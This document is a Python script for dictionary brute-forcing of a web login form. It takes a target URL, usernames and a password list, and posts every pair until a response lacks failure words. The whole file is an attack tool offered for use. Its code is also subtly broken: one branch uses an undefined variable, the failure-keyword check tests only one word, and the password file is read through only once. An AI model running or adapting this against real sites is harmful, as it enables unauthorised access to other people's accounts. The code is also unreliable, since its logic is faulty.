import requests
from termcolor import colored




print("WELLCOME !!!!")
url = input('[+] Enter the url : ')
user = input('[+] Enter the username : ')
pass_file = input('[+] Enter the Password Dictionery file with Extention : ')
cookiee = input('[+]{*optional} Enter Cookie value : ')




def cracking(url):
    for username in userF:
        username = username.strip()
        for Pass in Passwords:
            Pass = Pass.strip()
            print(colored(('[*] Trying :' + username + ' : ' + Pass),'red'))
            data = {'username':username, 'password':Pass, 'Login':'submit'}
            
            if cookiee != '':
                response = requests.post(url, params={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookiee})
            else:
                response = requests.post(url, data=data)
            if ('failed' or 'wrong' or 'Wrong' or 'Failed' or 'error' or 'Error' or 'incorrect' or 'Incorrect') in response.content.decode():
                pass
            else:
                print(colored(('[*] Found Username -->>', username),'green'))
                print(colored(('[*] Found Password -->>', Pass), 'green'))
                exit()




with open(pass_file, 'r') as Passwords:
    
    if '.txt' in user:
        with open(user, 'r') as userF:
            cracking(url)
    else:
        userF = [user]
        cracking(url)

    

print(colored(('[*] Password not Found!!!!'), 'red'))




